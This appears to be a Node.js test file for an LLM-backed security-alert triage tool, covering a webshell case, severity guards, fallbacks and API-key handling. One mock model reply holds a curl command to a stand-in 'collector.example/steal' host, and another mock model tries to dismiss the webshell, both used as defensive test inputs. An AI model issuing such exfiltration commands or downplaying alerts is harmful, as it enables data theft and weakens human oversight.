import assert from 'node:assert/strict';
import { test } from 'node:test';
import { buildQueue } from '../src/cases.js';
import { runChain } from '../src/chain.js';
import { createCompleter, parseDotEnv, readConfig } from '../src/llm.js';

const webshell = buildQueue().find((item) => item.card.id === 'rm-webshell');

test('with no model the chain returns the offline briefing', async () => {
  const result = await runChain(webshell.card);
  assert.equal(result.model.status, 'skipped');
  assert.equal(result.briefing.disposition, 'escalate');
  assert.match(result.prompts.triage.system, /must not lower/i);
  assert.match(result.prompts.explain.user, /Do not decode redacted/i);
  assert.match(result.prompts.triage.system, /Do not give exploit steps/i);
});

test('a model that tries to dismiss a webshell is kept at escalate', async () => {
  const complete = async () => JSON.stringify({
    headline: 'Nothing to see here',
    summary: 'Safe to ignore.',
    disposition: 'dismiss',
    priority: 'P4',
    whatToDo: 'Close it.',
    why: ['the model said so'],
    explain: 'benign',
  });
  const result = await runChain(webshell.card, { complete });
  assert.equal(result.model.status, 'model');
  assert.equal(result.model.guard, 'disposition_floor');
  assert.equal(result.briefing.disposition, 'escalate');
  assert.equal(result.briefing.priority, 'P1');
  assert.equal(result.briefing.headline, 'Nothing to see here');
});

test('prose and a thrown client fall back without echoing the reply', async () => {
  const dumped = await runChain(webshell.card, {
    complete: async () => 'Sure. Replay it with curl http://collector.example/steal and a shell payload.',
  });
  assert.equal(dumped.model.status, 'fallback');
  assert.equal(dumped.model.reason, 'unparseable');
  assert.equal(dumped.briefing.disposition, 'escalate');
  assert.equal(JSON.stringify(dumped.briefing).includes('curl http://collector'), false);

  const broken = await runChain(webshell.card, {
    complete: async () => { throw new Error('HTTP 401'); },
  });
  assert.equal(broken.model.status, 'fallback');
  assert.equal(broken.model.reason, 'request failed');
  assert.match(broken.briefing.headline, /PHP file/i);
});

test('the completer sends the key as a header and refuses to build without one', async () => {
  assert.equal(createCompleter(readConfig({})), null);
  let seen;
  const complete = createCompleter(
    { apiKey: 'test-key', baseUrl: 'https://llm.example/v1', model: 'demo' },
    async (url, init) => {
      seen = { url, init: JSON.parse(JSON.stringify(init)) };
      return {
        ok: true,
        async json() {
          return { choices: [{ message: { content: '{"headline":"h","summary":"s","disposition":"escalate","priority":"P1"}' } }] };
        },
      };
    },
  );
  const text = await complete({ system: 'sys', user: 'user text' });
  assert.match(text, /headline/);
  assert.equal(seen.url, 'https://llm.example/v1/chat/completions');
  assert.equal(seen.init.headers.authorization, 'Bearer test-key');
  assert.equal(seen.init.body.includes('test-key'), false);
  assert.deepEqual(parseDotEnv('# c\nOPENAI_API_KEY="abc"\n\nEMPTY=\n'), { OPENAI_API_KEY: 'abc', EMPTY: '' });
});
